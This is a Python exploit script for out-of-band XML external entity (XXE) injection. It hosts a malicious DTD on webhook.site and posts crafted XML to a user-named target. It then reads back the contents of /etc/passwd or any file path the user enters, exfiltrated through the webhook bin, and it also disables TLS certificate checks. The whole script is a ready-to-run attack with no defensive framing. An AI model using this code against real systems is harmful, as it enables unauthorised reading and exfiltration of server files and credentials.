#!/usr/bin/python3
import ssl, requests, json, urllib.parse, sys

requests.packages.urllib3.disable_warnings()

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

ocontext = ssl.SSLContext()

webhookurl = "https://webhook.site/token"
if len(sys.argv) != 2:
    print('Usage: python3 '+sys.argv[0]+' <vulnerable host with endpoint>\nExample: python3 '+sys.argv[0]+' http://example.com/login')
    sys.exit(1)
vulnhost = sys.argv[1]

# webhook bin for output
data = {'timeout':'0'}
r = requests.post(url = webhookurl, data = data)
webhookresp = json.loads(r.text)
webhookoutput = webhookresp['uuid']

#creating template dtd
readfile = "/etc/passwd"
dtd = "<!ENTITY % p1 SYSTEM \"file://"+readfile+"\">\r\n<!ENTITY % p2 \"<!ENTITY e1 SYSTEM 'http://webhook.site/"+webhookoutput+"/XXE?%p1;'>\">\r\n%p2;"
data = {'timeout':'0', 'default_content':dtd}

r = requests.post(url = webhookurl, data = data)

webhookresp = json.loads(r.text)
webhookdtd = webhookresp['uuid']

while True:
    readfile = input('>> Enter file path: ')

    #update file in dtd (because we don't want to create mutiple bins)
    dtd = "<!ENTITY % p1 SYSTEM \"file://"+readfile+"\">\r\n<!ENTITY % p2 \"<!ENTITY e1 SYSTEM 'http://webhook.site/"+webhookoutput+"/XXE?%p1;'>\">\r\n%p2;"
    data = {"default_status":"200","default_content_type":"text/plain","timeout":"0","default_content":dtd}
    r = requests.put(url = webhookurl+"/"+webhookdtd, data = data)
    print("[+] DTD Updated")

    #post data to vulnerable host
    
    payload = '''<?xml version="1.0"?>
    <!DOCTYPE foo SYSTEM "http://webhook.site/'''+webhookdtd+'''">
    <foo>&e1;</foo>
    '''

    headers = {'Content-Type': 'text/xml'}
    r = requests.post(url = vulnhost, data = payload, headers = headers)
    print("[+] Request posted to vulnerable host")

    #check response 
    webhookrequests = webhookurl+"/"+webhookoutput+"/requests"
    r = requests.get(url = webhookrequests)
    filedata = json.loads(r.text)['data'][0]['url']
    filedata = filedata.replace('http://webhook.site/'+webhookoutput+'/XXE?','')
    print(">> Content Received: ")
    print(urllib.parse.unquote(filedata))

    #clean requests
    webhookclean = webhookurl+"/"+webhookoutput+"/request"
    r = requests.delete(url = webhookclean)
    webhookcleanresp = json.loads(r.text)
